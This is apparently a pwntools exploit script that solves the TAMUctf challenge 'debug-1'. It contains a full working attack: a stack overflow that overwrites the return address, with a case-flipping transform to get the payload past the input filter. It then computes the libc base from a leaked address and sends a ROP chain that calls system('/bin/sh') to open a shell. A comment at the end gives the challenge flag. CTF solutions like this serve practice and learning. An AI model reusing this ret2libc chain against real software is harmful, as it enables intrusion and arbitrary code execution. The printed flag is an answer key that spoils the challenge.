from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./debug-1_patched', '''
    b *0x4013a0
    continue
''')

# p = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_debug-1")

def reverse_modify(payload):
    result = b''
    for byte in payload:
        if 65 <= byte <= 90:
            result += bytes([byte + 32])
        elif 97 <= byte <= 122:
            result += bytes([byte - 32])
        else:
            result += bytes([byte])
    return result

# 1. stack overflow to overwrite return address
p.sendlineafter(b"3: Exit\n\n", b'1')
p.sendafter(b"Input a string (max length of 69 characters):\n\n", reverse_modify(b'\x00'*0x58+p64(0x4013a0)))

# 2. ROP to pop a shell
glibc_e = ELF('./libc.so.6')
p.sendlineafter(b"3. Feature 3 (I hope your day is going well :) )\n", b'1')
p.recvuntil(b"libc leak: ")
glibc_base_addr = int(p.recvline().strip().decode(), 16)-glibc_e.sym.system
log.info(f"glibc base address: {hex(glibc_base_addr)}")
chain = [
    glibc_base_addr+next(glibc_e.search(asm('pop rdi; ret;'), executable=True)),
    glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00')),
    glibc_base_addr+next(glibc_e.search(asm('ret;'), executable=True)),
    glibc_base_addr+glibc_e.sym.system
]
p.sendafter(b"Leave a message here (max: 80 characters)!\n", b'\0'*0x68+b''.join([p64(c) for c in chain]))

p.interactive()

# gigem{d3bUg61ng_n3w_c0d3_a24dcfe3}